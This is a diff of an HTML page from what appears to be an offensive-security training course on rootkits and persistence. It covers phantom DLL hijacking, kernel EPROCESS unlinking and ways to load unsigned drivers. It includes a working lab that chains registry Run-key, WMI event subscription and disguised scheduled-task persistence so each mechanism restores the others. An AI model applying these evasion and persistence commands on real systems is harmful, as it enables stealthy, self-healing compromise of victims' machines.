+=== PHANTOM DLL HIJACK ===
+
+# Step 1: Find executables that import non-existent DLLs
+# Tool: Process Monitor (ProcMon) from Sysinternals
+# Filter: Show DLL load attempts with NAME NOT FOUND
+
+# Common phantom DLLs:
+# - wlanapi.dll (not present on wired-only systems)
+# - slc.dll (Software Licensing Client — not on all editions)
+# - msfte.dll (Windows Search — not on all systems)
+
+# Step 2: Create the phantom DLL with our payload
+# The DLL must export the same functions the executable expects
+# Use DLL export forwarders to avoid crashes
+
+# Example: Create wlanapi.dll for a wired desktop
+# The executable tries to load wlanapi.dll → loads our DLL
+# Our DLL: runs payload, then returns "no wireless available"
+# The executable continues normally.
+
+# Advantages over normal DLL sideloading:
+# 1. No existing file to overwrite (less suspicious)
+# 2. The DLL "belongs" there — it's expected by the app
+# 3. AV is less likely to flag a "missing DLL being provided"
+            </div>
+
+            <div class="why-box">
+                <h5>Why phantom DLLs are stealthy</h5>
+                <p>When you replace an existing DLL (normal sideloading), the file hash changes. EDR may detect the modified hash. With phantom DLL hijacking, there is no original file to compare against. The DLL is "new" but "expected." <span class="neon-highlight">The executable itself asks for it.</span></p>
+            </div>
+        </div>
+
+        <h2>🧠 Method 6: Kernel-Mode Rootkits (The Nuclear Option)</h2>
+        <div class="step-box">
+            <h4>Unlinking from EPROCESS — True Invisibility</h4>
+            <p>The kernel maintains a doubly-linked list of all processes in the <span class="neon-highlight">EPROCESS</span> structure. If we remove our process from this list, the scheduler doesn't see it, Task Manager doesn't see it, and even kernel tools that walk the list don't see it. The process still exists in memory and still executes — it's just not on the list.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== KERNEL EPROCESS UNLINK ===
+
+// EPROCESS structure (simplified, Windows 10 1903):
+// +0x000 Pcb              : _KPROCESS
+// +0x2E8 ProcessListEntry : _LIST_ENTRY  <--- Forward/Backward links
+// +0x2F8 UniqueProcessId  : Ptr64 Void
+// +0x300 ActiveProcessLinks : _LIST_ENTRY  <--- The list we modify
+
+// To hide a process:
+// 1. Find our EPROCESS structure (using PsLookupProcessByProcessId)
+// 2. Read ActiveProcessLinks.Flink and Blink
+// 3. Modify the PREVIOUS process's Flink to point to our Flink
+// 4. Modify the NEXT process's Blink to point to our Blink
+// 5. Our process is now unlinked from the list
+
+// Before:  [Prev] <-> [Our Process] <-> [Next]
+// After:   [Prev] <-> [Next]
+// Our process still runs, but the list skips over it.
+
+// Detection: Cross-view analysis
+// - API says: 50 processes
+// - PspCidTable says: 51 processes
+// - The difference is the hidden process
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Kernel Rootkit Requirements</h5>
+                <p>Kernel rootkits require a signed driver or an exploit to load unsigned code. Windows 10/11 enforces Driver Signature Enforcement (DSE) and Secure Boot. Options: <span class="neon-highlight">1)</span> Steal a valid certificate, <span class="neon-highlight">2)</span> Exploit a vulnerable signed driver (BYOVD — Bring Your Own Vulnerable Driver), <span class="neon-highlight">3)</span> Disable DSE using an exploit (e.g., CVE-2023-21768). All are advanced and covered in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a>.</p>
+            </div>
+        </div>
+
+        <h2>🧪 Lab Exercise: Build a Process Hider</h2>
 
         <div class="step-box">
             <h4>Safe Practice: Hide calc.exe from Task Manager</h4>
@@ -343,6 +949,7 @@ NTSTATUS Hooked_NtQuerySystemInformation(
 
             <div id="rootkit-solution" style="display:none; margin-top: 1rem;">
                 <div class="code-block">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 === BUILD STEPS ===
 
 # 1. Open "Developer Command Prompt for VS 2022"
@@ -370,13 +977,125 @@ C:\temp> injector.exe taskmgr.exe C:\temp\process_hider.dll
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <h2>🧪 Lab Exercise: Tri-Vector Persistence Setup</h2>
+        <div class="step-box">
+            <h4>Build a Self-Healing Rootkit</h4>
+            <p>This exercise uses a benign payload (notepad.exe) to demonstrate tri-vector persistence without causing harm.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== TRI-VECTOR LAB (.42) ===
+
+# Step 1: Create the payload directory
+mkdir C:\Temp\PersistenceLab
+
+# Step 2: Vector 1 — Registry Run Key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistenceLab" /t REG_SZ /d "C:\Temp\PersistenceLab\notepad.exe" /f
+
+# Step 3: Vector 2 — WMI Event Subscription (every 5 minutes)
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = "PersistenceLabFilter"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = "PersistenceLabConsumer"
+    CommandLineTemplate = "C:\Temp\PersistenceLab\notepad.exe"
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}
+
+# Step 4: Vector 3 — Scheduled Task (on logon)
+schtasks /create /tn "Microsoft\Windows\Maintenance\PersistenceLab" /tr "C:\Temp\PersistenceLab\notepad.exe" /sc onlogon /f
+
+# Step 5: Test self-healing
+# Delete the registry key:
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistenceLab" /f
+# Wait 5 minutes. The WMI event will restore it.
+
+# Delete the scheduled task:
+schtasks /delete /tn "Microsoft\Windows\Maintenance\PersistenceLab" /f
+# Log off and log on. The registry key will restore the task.
+            </div>
+
+            <div class="lab-evidence">
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistenceLab" /f</span></p>
+                <p><span class="out">The operation completed successfully.</span></p>
+                <p><span class="host">[.42 LAB]</span> <span class="cmd"># Wait 5 minutes...</span></p>
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" | findstr PersistenceLab</span></p>
+                <p><span class="out">    PersistenceLab    REG_SZ    C:\Temp\PersistenceLab\notepad.exe</span></p>
+                <p><span class="out"># Vector 2 (WMI) restored Vector 1 (Registry) automatically!</span></p>
+            </div>
+        </div>
+
+        <h2>📝 Interactive Quiz 1: Rootkit Fundamentals</h2>
+        <div class="quiz-container" id="quiz1">
+            <h3>Question 1: What is the PRIMARY purpose of a rootkit?</h3>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz1')">
+                A) To encrypt files and demand ransom
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'quiz1')">
+                B) To hide the presence of malware from detection tools
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz1')">
+                C) To spread to other computers on the network
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz1')">
+                D) To steal passwords from the browser
+            </div>
+            <div class="quiz-feedback" id="quiz1-feedback"></div>
+        </div>
+
+        <h2>📝 Interactive Quiz 2: Persistence Mechanisms</h2>
+        <div class="quiz-container" id="quiz2">
+            <h3>Question 2: Which persistence mechanism is FILELESS and lives in the WMI repository?</h3>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz2')">
+                A) Registry Run Keys
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz2')">
+                B) Scheduled Tasks
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'quiz2')">
+                C) WMI Event Subscriptions
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz2')">
+                D) DLL Sideloading
+            </div>
+            <div class="quiz-feedback" id="quiz2-feedback"></div>
+        </div>
+
+        <h2>📝 Interactive Quiz 3: Advanced Techniques</h2>
+        <div class="quiz-container" id="quiz3">
+            <h3>Question 3: Why does HWBP (Hardware Breakpoint) bypass Tamper Protection?</h3>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz3')">
+                A) It disables Windows Defender before making changes
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz3')">
+                B) It uses a kernel exploit to gain unrestricted access
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'quiz3')">
+                C) It modifies CPU debug registers, not memory, so software monitors can't see it
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'quiz3')">
+                D) It encrypts the AMSI/ETW functions so they can't be read
+            </div>
+            <div class="quiz-feedback" id="quiz3-feedback"></div>
+        </div>
+
+        <h2>📋 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Rootkit = hiding, not attacking:</strong> The payload is separate. The rootkit enables stealth.</li>
-            <li><strong>HWBP bypasses Tamper Protection:</strong> Zero memory writes = no software detection.</li>
-            <li><strong>User-mode hooks are fragile:</strong> Kernel tools bypass them. Use for quick wins, not long-term persistence.</li>
-            <li><strong>Kernel-mode is king:>/strong> Unlink from EPROCESS = invisible to everything except raw memory forensics.</li>
+            <li><strong>Rootkit = hiding + persistence:</strong> The payload is separate. The rootkit enables stealth and ensures survival.</li>
+            <li><strong>HWBP bypasses Tamper Protection:</strong> Zero memory writes = no software detection. CPU debug registers are invisible to AV.</li>
+            <li><strong>User-mode hooks are fragile:</strong> Kernel tools and direct syscalls bypass them. Use for quick wins, not long-term persistence.</li>
+            <li><strong>Direct syscalls bypass EDR hooks:</strong> Skip ntdll.dll and call the kernel directly. Foundation of modern EDR evasion.</li>
+            <li><strong>Tri-vector persistence is self-healing:</strong> Three independent mechanisms restore each other. Removing one leaves two alive.</li>
+            <li><strong>DLL sideloading abuses trust:</strong> Signed executables load our DLLs. AV trusts the signature, not the DLL.</li>
+            <li><strong>Phantom DLL hijacking is stealthier:</strong> No existing file to overwrite. The executable itself asks for the missing DLL.</li>
+            <li><strong>Kernel-mode is king:</strong> Unlink from EPROCESS = invisible to everything except raw memory forensics.</li>
             <li><strong>Hardware is god mode:</strong> BIOS/UEFI rootkits survive OS reinstallation. The ultimate persistence.</li>
         </ul>
 
@@ -395,18 +1114,92 @@ C:\temp> injector.exe taskmgr.exe C:\temp\process_hider.dll
                     <td style="padding: 0.5rem;">KAV response (no alert)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
                 </tr>
-                <tr>
+                <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Tamper Protection bypass</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Registry persistence</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">WMI event subscription</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Scheduled task persistence</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Tri-vector self-healing</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">DLL sideloading (OneDrive)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Phantom DLL hijack detection</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
                 </tr>
             </table>
         </div>
 
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_10_CODE_INJECTION.html">← Module 10</a>
             <a href="MODULE_12_DEFENSIVE_VERIFY.html">Module 12 →</a>
         </div>
     </div>
+
+    <script>
+        function copyToClipboard(btn) {
+            const codeBlock = btn.parentElement;
+            const text = codeBlock.innerText.replace('Copy', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 2000);
+            }).catch(() => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 2000);
+            });
+        }
+
+        function checkAnswer(element, isCorrect, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(quizId + '-feedback');
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt === element) {
+                    opt.classList.add(isCorrect ? 'correct' : 'wrong');
+                }
+            });
+            
+            feedback.classList.add('show', isCorrect ? 'correct' : 'wrong');
+            if (isCorrect) {
+                feedback.innerHTML = '<strong>✅ Correct!</strong> ' + getCorrectExplanation(quizId);
+            } else {
+                feedback.innerHTML = '<strong>❌ Incorrect.</strong> ' + getCorrectExplanation(quizId);
+            }
+        }
+
+        function getCorrectExplanation(quizId) {
+            const explanations = {
+                'quiz1': 'A rootkit is a hiding mechanism, not an attack payload. Ransomware (A), worms (C), and password stealers (D) are payloads. The rootkit hides them.',
+                'quiz2': 'WMI Event Subscriptions store the trigger and action in the WMI repository (C:\Windows\System32\wbem\Repository). No files, no registry keys — completely fileless.',
+                'quiz3': 'HWBP modifies CPU debug registers (DR0-DR7), which are hardware state, not memory. Tamper Protection monitors memory writes, so it cannot detect register changes from user mode.'
+            };
+            return explanations[quizId] || '';
+        }
+    </script>
 </body>
 </html>
